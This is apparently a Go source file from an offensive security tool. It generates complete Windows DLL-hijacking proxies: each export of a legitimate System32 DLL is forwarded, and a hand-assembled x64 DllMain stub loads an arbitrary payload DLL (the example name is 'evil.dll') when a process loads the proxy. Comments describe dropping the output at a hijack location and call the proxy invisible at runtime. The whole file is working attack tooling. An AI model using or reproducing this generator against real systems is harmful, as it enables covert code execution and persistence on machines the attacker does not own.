package dllproxy

import (
	"bytes"
	"debug/pe"
	"encoding/binary"
	"errors"
	"fmt"
	"sort"
)

// Machine identifies the COFF machine type baked into the emitted PE.
type Machine uint16

const (
	// MachineAMD64 emits a PE32+ x86-64 DLL. Default and only Phase 1 target.
	MachineAMD64 Machine = pe.IMAGE_FILE_MACHINE_AMD64
	// MachineI386 is reserved for Phase 3 — 32-bit support.
	MachineI386 Machine = pe.IMAGE_FILE_MACHINE_I386
)

// String returns the canonical COFF machine name.
func (m Machine) String() string {
	switch m {
	case MachineAMD64:
		return "AMD64"
	case MachineI386:
		return "I386"
	default:
		return fmt.Sprintf("Machine(0x%04x)", uint16(m))
	}
}

// PathScheme controls how forwarder strings address the legitimate target DLL.
type PathScheme int

const (
	// PathSchemeGlobalRoot uses `\\.\GLOBALROOT\SystemRoot\System32\<target>` —
	// the perfect-proxy trick from mrexodia. Default. Avoids self-recursion
	// even when the proxy DLL sits in System32 itself, and survives most
	// path-redirection schemes (KnownDLLs aside).
	PathSchemeGlobalRoot PathScheme = iota

	// PathSchemeSystem32 uses `C:\Windows\System32\<target>`. Simpler to
	// read, but recurses into self if deployed at System32 — only safe for
	// hijack opportunities outside System32 (almost all real ones).
	PathSchemeSystem32
)

// String returns a human-readable scheme name.
func (p PathScheme) String() string {
	switch p {
	case PathSchemeGlobalRoot:
		return "GlobalRoot"
	case PathSchemeSystem32:
		return "System32"
	default:
		return fmt.Sprintf("PathScheme(%d)", int(p))
	}
}

// Options tunes the emitter. The zero value is valid — defaults to
// MachineAMD64 + PathSchemeGlobalRoot, no payload DLL.
type Options struct {
	// Machine selects the target architecture. Zero means MachineAMD64.
	Machine Machine

	// PathScheme selects how forwarder strings address the target.
	// Zero means PathSchemeGlobalRoot.
	PathScheme PathScheme

	// PayloadDLL is the filename (or absolute path) of an additional DLL
	// to LoadLibraryA on DLL_PROCESS_ATTACH. When non-empty, the emitter
	// embeds a tiny x64 DllMain stub plus an import directory referencing
	// kernel32!LoadLibraryA, so the loader resolves LoadLibraryA's IAT
	// slot before our stub runs.
	//
	// Pass "evil.dll" (the loader will search the usual order) or an
	// absolute path. The string is embedded verbatim in the proxy's
	// .rdata.
	//
	// When empty (zero value), the proxy is a pure forwarder — no
	// DllMain, no imports. That mode is invisible at runtime once
	// loaded; the real target executes as if loaded directly.
	PayloadDLL string
}

// Sentinel errors callers may inspect with errors.Is.
var (
	// ErrEmptyExports is returned when no exports are supplied — a DLL
	// with an empty export table is technically legal but useless as a
	// forwarder, and almost always indicates a caller bug.
	ErrEmptyExports = errors.New("dllproxy: at least one export required")
	// ErrEmptyTargetName is returned when targetName is blank.
	ErrEmptyTargetName = errors.New("dllproxy: target name required")
	// ErrI386NotSupported is returned for MachineI386 — Phase 3 work.
	ErrI386NotSupported = errors.New("dllproxy: MachineI386 not yet implemented (phase 3)")
)

// Generate emits a Windows DLL byte stream proxying targetName's named
// exports back to the legitimate target. The result is a complete PE
// image ready to be written to disk and dropped at a hijack location.
//
// The emitter validates inputs, sorts exports alphabetically (Windows
// loader requires that for the binary search by name), and produces:
//
//   - With Options.PayloadDLL == "": a forwarder-only PE — single
//     .rdata section, no .text, no DllMain, entry point zero. Windows
//     accepts this layout (loader skips the absent DllMain on
//     DLL_PROCESS_ATTACH) and the proxy is invisible at runtime once
//     loaded.
//   - With Options.PayloadDLL set: a two-section PE — a tiny x64 .text
//     stub that LoadLibraryA's the payload on DLL_PROCESS_ATTACH, plus
//     .rdata holding the export directory, forwarder strings, an
//     import descriptor for kernel32!LoadLibraryA, the IAT, and the
//     payload-name string.
//
// On any input error a sentinel from the package's Err* set is
// returned — wrap with errors.Is to switch on cause.
func Generate(targetName string, exports []string, opts Options) ([]byte, error) {
	if targetName == "" {
		return nil, ErrEmptyTargetName
	}
	if len(exports) == 0 {
		return nil, ErrEmptyExports
	}
	if opts.Machine == 0 {
		opts.Machine = MachineAMD64
	}
	if opts.Machine != MachineAMD64 {
		return nil, fmt.Errorf("%w: got %s", ErrI386NotSupported, opts.Machine)
	}

	sortedExports := make([]string, len(exports))
	copy(sortedExports, exports)
	sort.Strings(sortedExports)

	if opts.PayloadDLL == "" {
		return assembleForwarderOnly(targetName, sortedExports, opts)
	}
	return assembleWithPayload(targetName, sortedExports, opts)
}

func assembleForwarderOnly(targetName string, sortedExports []string, opts Options) ([]byte, error) {
	const rdataVA = sectionAlignment
	rdata, exportSize := buildExportData(targetName, sortedExports, opts.PathScheme, rdataVA)

	var dataDirs [16]pe.DataDirectory
	dataDirs[pe.IMAGE_DIRECTORY_ENTRY_EXPORT] = pe.DataDirectory{
		VirtualAddress: rdataVA,
		Size:           exportSize,
	}
	secs := []section{
		{name: ".rdata", rva: rdataVA, contents: rdata, characteristics: imageRDataCharacteristics},
	}
	return assemblePE(secs, 0, dataDirs, opts.Machine), nil
}

func assembleWithPayload(targetName string, sortedExports []string, opts Options) ([]byte, error) {
	const (
		textVA  = sectionAlignment     // 0x1000
		rdataVA = sectionAlignment * 2 // 0x2000
	)

	exportPart, exportSize := buildExportData(targetName, sortedExports, opts.PathScheme, rdataVA)
	importPart, irng := buildImportData(opts.PayloadDLL, rdataVA+exportSize)
	rdata := append(exportPart, importPart...)

	textBytes := buildDllMainStub(irng.payloadStringRVA, irng.iatEntryRVA, textVA)

	var dataDirs [16]pe.DataDirectory
	dataDirs[pe.IMAGE_DIRECTORY_ENTRY_EXPORT] = pe.DataDirectory{
		VirtualAddress: rdataVA,
		Size:           exportSize,
	}
	dataDirs[pe.IMAGE_DIRECTORY_ENTRY_IMPORT] = pe.DataDirectory{
		VirtualAddress: irng.descriptorRVA,
		Size:           irng.descriptorSize,
	}
	dataDirs[pe.IMAGE_DIRECTORY_ENTRY_IAT] = pe.DataDirectory{
		VirtualAddress: irng.iatRVA,
		Size:           irng.iatSize,
	}
	secs := []section{
		{name: ".text", rva: textVA, contents: textBytes, characteristics: imageTextCharacteristics},
		{name: ".rdata", rva: rdataVA, contents: rdata, characteristics: imageRDataCharacteristics},
	}
	return assemblePE(secs, textVA, dataDirs, opts.Machine), nil
}

// PE / COFF / Optional-Header constants used by the emitter. Anything
// stdlib `debug/pe` exposes is referenced through that package; only
// the few it omits ship as locals.
const (
	dosMagic    = 0x5A4D     // "MZ"
	peSignature = 0x00004550 // "PE\0\0"

	imageFileCharacteristics   = pe.IMAGE_FILE_EXECUTABLE_IMAGE | pe.IMAGE_FILE_LARGE_ADDRESS_AWARE | pe.IMAGE_FILE_DLL
	imageDLLCharacteristicsNXC = pe.IMAGE_DLLCHARACTERISTICS_NX_COMPAT
	imageRDataCharacteristics  = pe.IMAGE_SCN_CNT_INITIALIZED_DATA | pe.IMAGE_SCN_MEM_READ
	imageTextCharacteristics   = pe.IMAGE_SCN_CNT_CODE | pe.IMAGE_SCN_MEM_EXECUTE | pe.IMAGE_SCN_MEM_READ
	imageOptionalHdr64Magic    = 0x020B // not exposed by stdlib debug/pe
	imageNumberOfDirectoryRVAs = 16     // not exposed by stdlib debug/pe

	dosHeaderSize      = 64
	coffHeaderSize     = 20
	optionalHeader64Sz = 240
	sectionHeaderSize  = 40

	fileAlignment    = 0x200
	sectionAlignment = 0x1000
	imageBase64      = 0x180000000
)

// section is a thin layout descriptor used by the multi-section
// emitter — the caller knows each section's RVA and contents; the
// emitter is responsible only for headers and file-offset placement.
type section struct {
	name            string
	rva             uint32
	contents        []byte
	characteristics uint32
}

// buildExportData produces the export-directory portion of the proxy
// DLL's .rdata section: directory header, function/name/ordinal
// arrays, DLL name, forwarder strings, and export name strings. Returns
// the bytes plus the size — the IMAGE_DIRECTORY_ENTRY_EXPORT data
// directory entry must span exactly that many bytes from sectionVA so
// every forwarder RVA falls inside the range (loader-side detection
// rule for forwarder exports).
//
// sectionVA is the RVA at which the bytes will be loaded — needed
// because every absolute RVA stamped into the directory (function,
// name, ordinal table addresses) is relative to the image base.
func buildExportData(targetName string, sortedExports []string, scheme PathScheme, sectionVA uint32) ([]byte, uint32) {
	n := uint32(len(sortedExports))
	const exportDirSz = 40

	addrFuncsOffset := uint32(exportDirSz)              // immediately after the directory struct
	addrNamesOffset := addrFuncsOffset + 4*n            // uint32 per function
	addrOrdsOffset := addrNamesOffset + 4*n             // uint32 per name
	stringsOffset := addrOrdsOffset + 2*n               // uint16 per ordinal

	// Strings table layout (concatenated, NUL-terminated):
	//   1. DLL name ("<targetName>\0")
	//   2. forwarder string per export (sorted order)
	//   3. export name per export (sorted order)
	// Items 2 and 3 are interleaved per-export so we keep one loop.
	dllNameRVA := sectionVA + stringsOffset
	dllNameBytes := append([]byte(targetName), 0)
	cursor := stringsOffset + uint32(len(dllNameBytes))

	prefix := forwarderPrefix(scheme, targetName)

	forwarderRVAs := make([]uint32, n)
	exportNameRVAs := make([]uint32, n)
	var stringsBuf bytes.Buffer
	stringsBuf.Write(dllNameBytes)

	for i, name := range sortedExports {
		fwd := prefix + name
		forwarderRVAs[i] = sectionVA + cursor
		stringsBuf.WriteString(fwd)
		stringsBuf.WriteByte(0)
		cursor += uint32(len(fwd) + 1)

		exportNameRVAs[i] = sectionVA + cursor
		stringsBuf.WriteString(name)
		stringsBuf.WriteByte(0)
		cursor += uint32(len(name) + 1)
	}

	out := make([]byte, stringsOffset)

	// IMAGE_EXPORT_DIRECTORY
	binary.LittleEndian.PutUint32(out[0:], 0)                                // Characteristics
	binary.LittleEndian.PutUint32(out[4:], 0)                                // TimeDateStamp
	binary.LittleEndian.PutUint16(out[8:], 0)                                // MajorVersion
	binary.LittleEndian.PutUint16(out[10:], 0)                               // MinorVersion
	binary.LittleEndian.PutUint32(out[12:], dllNameRVA)                      // Name (RVA to dll name string)
	binary.LittleEndian.PutUint32(out[16:], 1)                               // Base (ordinal 1 .. N)
	binary.LittleEndian.PutUint32(out[20:], n)                               // NumberOfFunctions
	binary.LittleEndian.PutUint32(out[24:], n)                               // NumberOfNames
	binary.LittleEndian.PutUint32(out[28:], sectionVA+addrFuncsOffset)       // AddressOfFunctions
	binary.LittleEndian.PutUint32(out[32:], sectionVA+addrNamesOffset)       // AddressOfNames
	binary.LittleEndian.PutUint32(out[36:], sectionVA+addrOrdsOffset)        // AddressOfNameOrdinals

	// AddressOfFunctions: forwarder RVAs (forwarder iff RVA falls inside
	// the export directory data range, which we ensure by choosing the
	// export-table data-directory size to span the entire .rdata content).
	for i, rva := range forwarderRVAs {
		binary.LittleEndian.PutUint32(out[addrFuncsOffset+uint32(i)*4:], rva)
	}
	for i, rva := range exportNameRVAs {
		binary.LittleEndian.PutUint32(out[addrNamesOffset+uint32(i)*4:], rva)
	}
	// AddressOfNameOrdinals — identity map since we sorted both names
	// and forwarder slots into the same alphabetic order.
	for i := uint32(0); i < n; i++ {
		binary.LittleEndian.PutUint16(out[addrOrdsOffset+i*2:], uint16(i))
	}

	out = append(out, stringsBuf.Bytes()...)
	return out, uint32(len(out))
}

// forwarderPrefix returns the constant prefix prepended to each export
// name to form the absolute path forwarder string.
func forwarderPrefix(scheme PathScheme, targetName string) string {
	switch scheme {
	case PathSchemeSystem32:
		return `C:\Windows\System32\` + targetName + "."
	default: // PathSchemeGlobalRoot
		return `\\.\GLOBALROOT\SystemRoot\System32\` + targetName + "."
	}
}

// assemblePE stamps the COFF / Optional / Section headers around the
// supplied sections (in caller-provided RVA order) and returns the
// final PE image. The data directory is filled from dataDirs as-is —
// callers populate the entries that matter (EXPORT, IMPORT, IAT) and
// leave the rest zero. addressOfEntryPoint may be 0 (no DllMain).
//
// Headers are written through stdlib [debug/pe] structs so on-disk
// layout matches the spec without any hand-counted offsets.
func assemblePE(secs []section, addressOfEntryPoint uint32, dataDirs [16]pe.DataDirectory, machine Machine) []byte {
	const peHeaderOffset = dosHeaderSize // e_lfanew = 0x40

	headersEnd := uint32(peHeaderOffset+4+coffHeaderSize+optionalHeader64Sz) + uint32(len(secs))*sectionHeaderSize
	sizeOfHeaders := alignUp(headersEnd, fileAlignment)

	// Compute file offset and raw size for each section.
	type secFile struct {
		raw     uint32 // SizeOfRawData (file-aligned)
		fileOff uint32 // PointerToRawData
	}
	files := make([]secFile, len(secs))
	fileOff := sizeOfHeaders
	var sumInitData, sumCode uint32
	for i, s := range secs {
		raw := alignUp(uint32(len(s.contents)), fileAlignment)
		files[i] = secFile{raw: raw, fileOff: fileOff}
		fileOff += raw
		if s.characteristics&pe.IMAGE_SCN_CNT_CODE != 0 {
			sumCode += uint32(len(s.contents))
		}
		if s.characteristics&pe.IMAGE_SCN_CNT_INITIALIZED_DATA != 0 {
			sumInitData += uint32(len(s.contents))
		}
	}
	last := secs[len(secs)-1]
	imageSize := alignUp(last.rva+uint32(len(last.contents)), sectionAlignment)

	codeRVA := uint32(0)
	for _, s := range secs {
		if s.characteristics&pe.IMAGE_SCN_CNT_CODE != 0 {
			codeRVA = s.rva
			break
		}
	}

	coff := pe.FileHeader{
		Machine:              uint16(machine),
		NumberOfSections:     uint16(len(secs)),
		SizeOfOptionalHeader: optionalHeader64Sz,
		Characteristics:      imageFileCharacteristics,
	}
	opt := pe.OptionalHeader64{
		Magic:                       imageOptionalHdr64Magic,
		MajorLinkerVersion:          14,
		SizeOfCode:                  sumCode,
		SizeOfInitializedData:       sumInitData,
		AddressOfEntryPoint:         addressOfEntryPoint,
		BaseOfCode:                  codeRVA,
		ImageBase:                   imageBase64,
		SectionAlignment:            sectionAlignment,
		FileAlignment:               fileAlignment,
		MajorOperatingSystemVersion: 6,
		MajorSubsystemVersion:       6,
		SizeOfImage:                 imageSize,
		SizeOfHeaders:               sizeOfHeaders,
		Subsystem:                   pe.IMAGE_SUBSYSTEM_WINDOWS_GUI,
		DllCharacteristics:          imageDLLCharacteristicsNXC,
		SizeOfStackReserve:          0x100000,
		SizeOfStackCommit:           0x1000,
		SizeOfHeapReserve:           0x100000,
		SizeOfHeapCommit:            0x1000,
		NumberOfRvaAndSizes:         imageNumberOfDirectoryRVAs,
		DataDirectory:               dataDirs,
	}

	hdr := bytes.NewBuffer(make([]byte, 0, sizeOfHeaders))
	hdr.Write(make([]byte, peHeaderOffset)) // DOS header zero-pad — patched below
	binary.Write(hdr, binary.LittleEndian, uint32(peSignature))
	binary.Write(hdr, binary.LittleEndian, &coff)
	binary.Write(hdr, binary.LittleEndian, &opt)
	for i, s := range secs {
		sh := pe.SectionHeader32{
			Name:             secNameBytes(s.name),
			VirtualSize:      uint32(len(s.contents)),
			VirtualAddress:   s.rva,
			SizeOfRawData:    files[i].raw,
			PointerToRawData: files[i].fileOff,
			Characteristics:  s.characteristics,
		}
		binary.Write(hdr, binary.LittleEndian, &sh)
	}

	out := make([]byte, fileOff)
	copy(out, hdr.Bytes())
	binary.LittleEndian.PutUint16(out[0:], dosMagic)
	binary.LittleEndian.PutUint32(out[0x3c:], peHeaderOffset)
	for i, s := range secs {
		copy(out[files[i].fileOff:], s.contents)
	}
	return out
}

// secNameBytes packs an ASCII section name (max 8 chars) into the
// fixed-size [8]uint8 the IMAGE_SECTION_HEADER expects, zero-padding
// the right.
func secNameBytes(name string) [8]uint8 {
	var b [8]uint8
	copy(b[:], name)
	return b
}

// alignUp rounds n up to the nearest multiple of align (which must be
// a power of two — fileAlignment and sectionAlignment satisfy that).
func alignUp(n, align uint32) uint32 {
	return (n + align - 1) &^ (align - 1)
}

// importLayout records the in-image RVAs the DllMain stub needs to
// know about (IAT slot for LoadLibraryA, payload-name string) and the
// import-directory range the loader walks.
type importLayout struct {
	descriptorRVA    uint32
	descriptorSize   uint32
	iatRVA           uint32
	iatSize          uint32
	iatEntryRVA      uint32
	payloadStringRVA uint32
}

// buildImportData lays out the import directory entry for kernel32 +
// the lone LoadLibraryA import + the payload string, all packed in a
// single contiguous blob the caller appends after the export portion
// of .rdata.
//
// baseRVA is the RVA at which the blob's first byte will live.
//
// Layout (offsets relative to baseRVA):
//
//	+0    IMAGE_IMPORT_DESCRIPTOR for kernel32      (20)
//	+20   IMAGE_IMPORT_DESCRIPTOR null terminator   (20)
//	+40   ILT (uint64 ptr to hint-name) + null      (16)
//	+56   IAT (uint64 — loader fills with the resolved address)+null (16)
//	+72   Hint(2)+"LoadLibraryA"(13)+pad(1)         (16)
//	+88   "kernel32.dll\0"                          (13)
//	+101  payload string + NUL                      (variable)
func buildImportData(payload string, baseRVA uint32) ([]byte, importLayout) {
	const (
		iidSize     = 20
		iidArrayLen = iidSize * 2 // descriptor + null terminator
		iltOffset   = iidArrayLen
		iltSize     = 16 // 1 entry + null terminator (uint64 each)
		iatOffset   = iltOffset + iltSize
		iatSize     = iltSize
		hintOffset  = iatOffset + iatSize
		// "LoadLibraryA": 12 bytes name + 1 NUL = 13; pad to next even → 14;
		// allocate 16 (including the leading uint16 hint) for clarity.
		hintNameSize = 16
		dllOffset    = hintOffset + hintNameSize
	)
	const dllName = "kernel32.dll"
	dllBytes := append([]byte(dllName), 0)
	payloadOffset := uint32(dllOffset + len(dllBytes))
	payloadBytes := append([]byte(payload), 0)
	totalSize := payloadOffset + uint32(len(payloadBytes))

	out := make([]byte, totalSize)

	// IMAGE_IMPORT_DESCRIPTOR — kernel32 entry.
	binary.LittleEndian.PutUint32(out[0:], baseRVA+iltOffset)        // OriginalFirstThunk → ILT
	binary.LittleEndian.PutUint32(out[4:], 0)                        // TimeDateStamp
	binary.LittleEndian.PutUint32(out[8:], 0)                        // ForwarderChain
	binary.LittleEndian.PutUint32(out[12:], baseRVA+uint32(dllOffset)) // Name → "kernel32.dll"
	binary.LittleEndian.PutUint32(out[16:], baseRVA+iatOffset)       // FirstThunk → IAT

	// Trailing 20 zero bytes from make() act as the null IID terminator.

	// ILT entry: low 31 bits = RVA to hint/name, high bit clear = "by name".
	binary.LittleEndian.PutUint64(out[iltOffset:], uint64(baseRVA+hintOffset))
	// IAT entry: same shape on disk; loader rewrites with resolved address.
	binary.LittleEndian.PutUint64(out[iatOffset:], uint64(baseRVA+hintOffset))

	// Hint/name: hint=0, then "LoadLibraryA\0", padding stays zero.
	binary.LittleEndian.PutUint16(out[hintOffset:], 0)
	copy(out[hintOffset+2:], "LoadLibraryA")

	copy(out[dllOffset:], dllBytes)
	copy(out[payloadOffset:], payloadBytes)

	return out, importLayout{
		descriptorRVA:    baseRVA,
		descriptorSize:   iidArrayLen,
		iatRVA:           baseRVA + iatOffset,
		iatSize:          iatSize,
		iatEntryRVA:      baseRVA + iatOffset, // single import — slot is at iatRVA
		payloadStringRVA: baseRVA + payloadOffset,
	}
}

// dllMainStubLen is the fixed size of the x64 DllMain stub
// [buildDllMainStub] emits — surfaced for the section-virtual-size
// computation in [assembleWithPayload].
const dllMainStubLen = 32

// buildDllMainStub emits a 32-byte x64 entry-point that:
//   - returns TRUE for every reason ≠ DLL_PROCESS_ATTACH;
//   - on DLL_PROCESS_ATTACH, calls LoadLibraryA(payload) via the IAT
//     slot the Windows loader resolved before our entry runs, then
//     returns TRUE regardless of whether the payload load succeeded.
//
// Stack: `sub rsp, 28h` reserves the Win64 32-byte shadow space and
// keeps RSP 16-byte aligned for the upcoming CALL. `add rsp, 28h`
// undoes it. RIP-relative addressing is used for both the payload
// string LEA and the IAT-slot CALL — disp32 is computed from the
// section RVAs the caller passes in.
//
// Layout (32 bytes total):
//
//	00  cmp edx, 1                       83 FA 01
//	03  jne ret_true (+21)               75 15
//	05  sub rsp, 28h                     48 83 EC 28
//	09  lea rcx, [rip+payload_disp32]    48 8D 0D xx xx xx xx
//	16  call qword ptr [rip+iat_disp32]  FF 15 xx xx xx xx
//	22  add rsp, 28h                     48 83 C4 28
//	26  mov eax, 1                       B8 01 00 00 00
//	31  ret                              C3
func buildDllMainStub(payloadStringRVA, iatEntryRVA, textRVA uint32) []byte {
	stub := []byte{
		0x83, 0xFA, 0x01, // cmp edx, 1
		0x75, 0x15, // jne +21 (target = offset 26)
		0x48, 0x83, 0xEC, 0x28, // sub rsp, 28h
		0x48, 0x8D, 0x0D, 0, 0, 0, 0, // lea rcx, [rip+disp32]   (patch @ off 12)
		0xFF, 0x15, 0, 0, 0, 0, // call qword ptr [rip+disp32]   (patch @ off 18)
		0x48, 0x83, 0xC4, 0x28, // add rsp, 28h
		0xB8, 0x01, 0x00, 0x00, 0x00, // mov eax, 1
		0xC3, // ret
	}
	// `lea rcx, [rip+disp]` instruction ends at textRVA+16 — that's the
	// reference RIP for the disp32. Same shape for the call below.
	leaDisp := int32(payloadStringRVA) - int32(textRVA+16)
	binary.LittleEndian.PutUint32(stub[12:], uint32(leaDisp))
	callDisp := int32(iatEntryRVA) - int32(textRVA+22)
	binary.LittleEndian.PutUint32(stub[18:], uint32(callDisp))
	return stub
}
